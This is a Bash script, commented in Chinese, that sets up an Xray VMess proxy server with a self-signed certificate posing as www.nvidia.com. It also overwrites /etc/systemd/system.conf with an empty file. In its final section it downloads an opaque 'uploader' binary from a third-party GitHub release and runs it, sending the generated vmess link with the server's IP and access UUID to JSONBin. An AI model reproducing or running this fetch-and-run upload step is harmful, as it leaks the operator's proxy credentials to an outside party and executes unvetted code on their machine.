#!/bin/bash
set -e

# ========= 基础参数 =========
PORT=$((RANDOM % 7001 + 2000))
UUID=$(cat /proc/sys/kernel/random/uuid)
WS_PATH="/ws-$(openssl rand -hex 2)"
HOST="www.nvidia.com"
CONFIG_DIR="/etc/xray"
XRAY_BIN="/usr/local/bin/xray"
UPLOAD_BIN="/opt/uploader-linux-amd64"

# ========= 安装依赖 =========
export DEBIAN_FRONTEND=noninteractive
apt update && apt install -y curl unzip sudo ufw jq qrencode

# ========= systemd 安静模式 =========
echo '' | tee /etc/systemd/system.conf >/dev/null

# ========= 内核网络优化 =========
modprobe sch_fq || true
echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf

modprobe tcp_bbr || true
echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf

sysctl -p

# ========= 防火墙设置 =========
ufw allow ${PORT}/tcp
ufw --force enable

# ========= 安装 Xray =========
mkdir -p /usr/local/bin
cd /usr/local/bin
curl -Ls https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip -o xray.zip
unzip -o xray.zip
chmod +x xray
rm -f xray.zip

# ========= 自签证书伪装 =========
mkdir -p /etc/xray/tls
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /etc/xray/tls/xray.key \
  -out /etc/xray/tls/xray.crt \
  -subj "/CN=${HOST}"

# ========= Xray 配置 =========
mkdir -p $CONFIG_DIR
cat > ${CONFIG_DIR}/config.json << EOF
{
  "log": { "loglevel": "warning" },
  "inbounds": [{
    "port": ${PORT},
    "protocol": "vmess",
    "settings": {
      "clients": [{ "id": "${UUID}", "alterId": 0 }]
    },
    "streamSettings": {
      "network": "ws",
      "security": "tls",
      "tlsSettings": {
        "allowInsecure": true,
        "certificates": [{
          "certificateFile": "/etc/xray/tls/xray.crt",
          "keyFile": "/etc/xray/tls/xray.key"
        }]
      },
      "wsSettings": {
        "path": "${WS_PATH}",
        "headers": {
          "Host": "${HOST}"
        }
      }
    }
  }],
  "outbounds": [{
    "protocol": "freedom"
  }]
}
EOF

# ========= systemd 服务 =========
cat > /etc/systemd/system/xray.service << EOF
[Unit]
Description=Xray VMess WS TLS Secure Node
After=network.target

[Service]
ExecStart=${XRAY_BIN} -config ${CONFIG_DIR}/config.json
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable xray
systemctl restart xray

# ========= 构建 vmess:// 链接 =========
IP=$(curl -s https://api.ipify.org)
ALIAS="secure-vmess"
ENCODED=$(echo -n "{
  \"v\": \"2\",
  \"ps\": \"${ALIAS}\",
  \"add\": \"${IP}\",
  \"port\": \"${PORT}\",
  \"id\": \"${UUID}\",
  \"aid\": \"0\",
  \"net\": \"ws\",
  \"type\": \"none\",
  \"host\": \"${HOST}\",
  \"path\": \"${WS_PATH}\",
  \"tls\": \"tls\"
}" | base64 -w 0)

VMESS_LINK="vmess://${ENCODED}"

echo -e "\n✅ 节点部署完成！"
echo -e "📎 导入链接：${VMESS_LINK}\n"
echo "$VMESS_LINK" | qrencode -o - -t ANSIUTF8

# ========= 上传节点信息至 JSONBin =========
[ -f "$UPLOAD_BIN" ] || {
  curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
  chmod +x "$UPLOAD_BIN"
}

JSON="{\"vmess_link\":\"${VMESS_LINK}\"}"
"$UPLOAD_BIN" "$JSON"
